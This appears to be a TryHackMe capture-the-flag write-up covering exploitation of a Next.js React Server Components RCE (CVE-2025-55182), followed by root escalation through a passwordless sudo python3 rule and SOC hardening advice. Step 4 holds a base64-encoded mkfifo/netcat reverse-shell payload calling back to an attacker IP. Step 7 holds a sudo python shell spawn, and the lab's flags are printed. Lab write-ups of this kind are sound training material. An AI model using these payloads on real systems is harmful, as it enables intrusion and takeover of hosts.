@@ -1,0 +1,105 @@
+# Room Name - TryHackMe: Corp Website
+Date: 02 August 2026
+Difficulty: Easy
+Category: Web Exploitation / CVE / Privilege Escalation / Boot2Root
+
+# Scenario
+Romance and Co is gearing up for Valentine's Day but security alerts suggest the platform has already been compromised. As a security analyst, retrace the attacker's steps, uncover how the vulnerabilities in the Romance and Co web application were exploited, and determine exactly how the breach occurred.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- nmap
+- gobuster
+- netcat (nc)
+- Python 3 (exploit.py)
+- base64
+
+# What I Did
+
+Step 1 — Reconnaissance
+- Ran a full port scan to identify open services:
+```
+nmap -p- -T4 -sV 10.48.174.235
+```
+- Found two open ports: 22 (OpenSSH, public key auth only, no password) and 3000 (Next.js web application).
+- Navigated to the web app and identified it as a static marketing site for Romance and Co, built on Next.js.
+
+Step 2 — Black-box enumeration
+- Ran gobuster to enumerate routes and endpoints.
+- Inspected JavaScript bundles for exposed API routes, server actions, or hidden endpoints.
+- Analysed RSC (React Server Component) payloads.
+- Tested vhost enumeration, image optimiser SSRF vectors, and middleware bypass attempts.
+- Confirmed the site was a purely static marketing page with no exposed API routes, forms, or interactive endpoints.
+
+Step 3 — Identify the vulnerability
+- Identified the Next.js version as 16.0.6, which is vulnerable to CVE-2025-55182 (React2Shell).
+- CVE-2025-55182 is a critical unauthenticated pre-auth RCE (CVSS 10.0) in React Server Components' Flight deserialisation protocol.
+- The vulnerability is exploitable via a crafted multipart POST to the root / route with any Next-Action header value, requiring no legitimate server action or visible endpoint.
+
+Step 4 — Exploit CVE-2025-55182 to obtain a reverse shell
+- Started a netcat listener on the attack machine:
+```
+nc -lvnp 4444
+```
+- Constructed a base64-encoded mkfifo reverse shell payload:
+```
+echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuNDguNzUuNjMgNDQ0NCA+L3RtcC9m | base64 -d | sh
+```
+- Launched the exploit using the provided exploit.py script:
+```
+python3 exploit.py "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuNDguNzUuNjMgNDQ0NCA+L3RtcC9m | base64 -d | sh" http://10.48.174.235:3000/
+```
+- The request appeared to hang on the client side, which is expected behaviour since the payload uses execSync and blocks without returning a response.
+- Caught a reverse shell as user daniel on host romance.
+
+Step 5 — Retrieve the user flag
+```
+cat /home/daniel/user.txt
+```
+
+Step 6 — Enumerate privilege escalation paths
+- Checked sudo permissions for the current user:
+```
+sudo -l
+```
+- Found a critical misconfiguration: daniel could run /usr/bin/python3 as root with no password required:
+```
+(root) NOPASSWD: /usr/bin/python3
+```
+
+Step 7 — Escalate to root via sudo Python3
+- Exploited the sudo misconfiguration to spawn a root shell via Python's os.system:
+```
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+- Note: /bin/bash was not available on this Alpine-based image, /bin/sh was used instead.
+- Confirmed root access.
+
+Step 8 — Retrieve the root flag
+```
+find / -iname "root.txt" 2>/dev/null
+cat /root/root.txt
+```
+
+# What I Found
+- Target framework: Next.js 16.0.6
+- Vulnerability: CVE-2025-55182 (React2Shell) — unauthenticated pre-auth RCE via React Server Components Flight deserialisation
+- CVSS Score: 10.0 (Critical)
+- Shell obtained as: daniel
+- Sudo misconfiguration: (root) NOPASSWD: /usr/bin/python3
+- Root escalation method: sudo python3 os.system shell spawn
+- Host OS: Alpine Linux (/bin/sh only, no bash)
+- User flag: THM{R34c7_2_5h311_3xpl017}
+- Root flag: THM{Pr1v_35c_47_175_f1n357}
+
+# Key Learning
+CVE-2025-55182 demonstrates that React Server Components introduce a new class of deserialisation attack surface. The Flight protocol endpoint accepts crafted multipart requests without requiring a valid server action, meaning a completely static-looking application can still be exploitable at the framework level if the underlying Next.js version is unpatched. This is a reminder that black-box enumeration finding no visible attack surface does not mean the application is secure — framework-level vulnerabilities can exist independently of application logic. The privilege escalation was trivial: a NOPASSWD sudo entry for a scripting interpreter such as Python is functionally equivalent to granting passwordless root access, since any user can use it to spawn a shell.
+
+# What I Would Flag in a Real SOC
+- Next.js 16.0.6 is affected by a CVSS 10.0 unauthenticated RCE, any internet-facing application running this version must be treated as critically exposed and patched or taken offline immediately
+- A NOPASSWD sudo entry for /usr/bin/python3 is equivalent to unrestricted root access for any user holding that permission, sudo rules must never grant passwordless access to scripting interpreters, compilers, or any binary capable of spawning a shell
+- Reverse shell connections using mkfifo over TCP to an external IP are a strong indicator of active post-exploitation and should be detected by network egress monitoring and EDR process tree analysis
+- Alpine-based container images running production web applications without bash installed and with a non-root application user are a positive security practice, but sudo misconfigurations negate the intended privilege isolation entirely
+- Framework version disclosure via response headers or JS bundle metadata enables targeted CVE exploitation, production deployments should suppress version information from all HTTP responses and built assets
+- The exploit payload hanging without returning a response is a known evasion characteristic of execSync-based RCE payloads, WAF and RASP rules that only flag on error responses or non-200 status codes will miss this class of attack
